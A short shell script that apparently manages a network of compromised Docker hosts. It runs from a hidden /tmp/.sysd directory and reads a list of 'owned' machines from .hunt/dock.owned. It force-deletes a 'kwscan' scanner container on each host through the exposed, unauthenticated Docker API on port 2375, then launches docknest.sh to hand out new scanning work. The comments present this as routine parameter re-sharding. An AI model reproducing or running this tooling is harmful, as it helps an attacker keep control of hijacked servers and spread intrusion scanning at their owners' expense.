#!/bin/sh
# throwaway: drop in-flight scanners so the next round re-shards with the new
# NEST_PAR/NEST_PERSHARD instead of leaving stale parameters running for 20 min.
cd /tmp/.sysd 2>/dev/null || exit 1
n=0
for i in $(cut -f1 .hunt/dock.owned | sort -u); do
    code=$(curl -sS -m 6 -o /dev/null -w '%{http_code}' -X DELETE "http://$i:2375/containers/kwscan?force=1" 2>/dev/null)
    if [ "$code" = "204" ] || [ "$code" = "200" ]; then n=$((n+1)); fi
done
echo "killed_scanners=$n"
# and hand out fresh work now rather than waiting for the timer
sh /tmp/.sysd/docknest.sh
date -u
